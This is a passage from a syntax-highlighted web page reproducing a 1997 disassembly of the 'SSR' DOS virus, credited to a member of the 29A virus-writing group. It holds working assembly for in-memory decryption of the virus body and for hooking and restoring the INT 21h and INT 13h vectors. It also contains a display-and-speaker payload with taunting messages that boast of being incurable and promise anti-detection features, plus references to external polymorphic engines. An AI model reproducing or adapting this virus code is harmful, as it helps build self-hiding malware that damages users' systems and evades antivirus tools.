</span><span class="sc5">mem_mask</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; mov cl,mem_mask</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">; Decrypt code in memory</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_decrypt_memcode</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">int_21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">     </span><span class="sc1">; call far</span><span class="sc0">
</span><span class="sc5">ofs_i21</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_i21</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 


                </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Unused!</span><span class="sc0">

</span><span class="sc5">set_original_i13h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get int 13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_actual_i13</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; Save it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_actual_i13</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_i13</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Set original int 13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_i13</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">restore_i13h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">ofs_actual_i13</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">       </span><span class="sc1">; Restore int 13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_actual_i13</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">    
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ofs_i13</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_i13</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ofs_actual_i13</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_actual_i13</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">warning_msg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0B800h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ES:=0B800 (text video segment)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">80</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; gotoxy(15,6)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">msg_alarm</span><span class="sc4">)-</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">           </span><span class="sc1">; Number of msgs</span><span class="sc0">
</span><span class="sc5">l_next_msg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc5">l_msg_nextchar</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; End of string?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">msg_end</span><span class="sc0">         </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">           </span><span class="sc1">; Textcolor=white</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Put character on screen</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_msg_nextchar</span><span class="sc0">

</span><span class="sc5">msg_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc2">80</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F20h</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0"> 
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Fill line with spaces</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">         </span><span class="sc1">; Next line</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_next_msg</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1010h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">l_change_colors</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sound</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">             </span><span class="sc1">; AX=1010h : Set individual DAC regs.</span><span class="sc0">
                                        </span><span class="sc1">; BX=0 -&gt; Color 0</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc0">              </span><span class="sc1">; Inc value for red</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loop_change_colors</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
        </span><span class="sc6">nop</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">12Ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">12Ch</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sound</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">loop_change_colors</span><span class="sc0">

                </span><span class="sc6">nop</span><span class="sc0">                     </span><span class="sc1">; Unused code !</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3E8h</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">12Ch</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sound</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">loop_change_colors</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">l_change_colors</span><span class="sc0">

</span><span class="sc5">sound</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Get the timer ready</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4F38h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; Send frecuency to timer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">          </span><span class="sc1">; PC/XT PPI port B bits:</span><span class="sc0">
                    </span><span class="sc1">; 0: Tmr 2 gate ÍËÍ OR 03H=spkr ON</span><span class="sc0">
                    </span><span class="sc1">; 1: Tmr 2 data Í¼  AND 0fcH=spkr OFF</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Speaker ON</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">l_loop_sound2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0AF1h</span><span class="sc0">
</span><span class="sc5">l_loop_sound1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l_loop_sound1</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">l_loop_sound2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           </span><span class="sc1">; Set Speaker to previous state</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">; PC/XT PPI port B bits:</span><span class="sc0">
                    </span><span class="sc1">; 0: Tmr 2 gate ÍËÍ OR 03H=spkr ON</span><span class="sc0">
                    </span><span class="sc1">; 1: Tmr 2 data Í¼  AND 0fcH=spkr OFF</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

                </span><span class="sc6">iret</span><span class="sc0">                    </span><span class="sc1">; Unused!</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Unused!</span><span class="sc0">

</span><span class="sc5">msg_alarm</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'     !!! ALARM WARNING DANGER APPROACHING !!!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' Hacker-fucker TSR shit or Any Virus Detected !!!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'  Anyone who wants to fuck Revenge is Naivnij Man'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'      With best Wishes to E.Kaspersky !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' Now I''m CURELESS !!! SND Used !!! Rules !!!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'In future versions I will add :'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' 1. Protected Mode Decryptor [SF0rCE]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'    (Web,try to emul IT :)))) )'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' 2. UniversalAntiDetector'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' 3. Must Die: Lamers,Webs &amp; other...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' 4. And other BUGs,GLUKs &amp; SHITs !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Dis is Continue... Win95 &amp; her lamers must die!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'         Searching... SEEK &amp; DESTROY'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'          There can be only one ...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc12">'--------------------'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc12">'--------------------'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc12">'Orign:NUkE HiM A11 !'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'BIG NAWOROT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'BUGS INSIDE &lt;tm&gt; '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">SSR</span><span class="sc0">     </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">res_engine</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ssrme_engine</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">mme_engine</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">host</span><span class="sc0">

</span><span class="sc1">; End of SSR disasm</span><span class="sc0">
</span><span class="sc1">; (c) 1997, Tcp/29A (tcp@cryogen.com)</span><span class="sc0">
</span><span class="sc1">;</span></div></body>
</html>
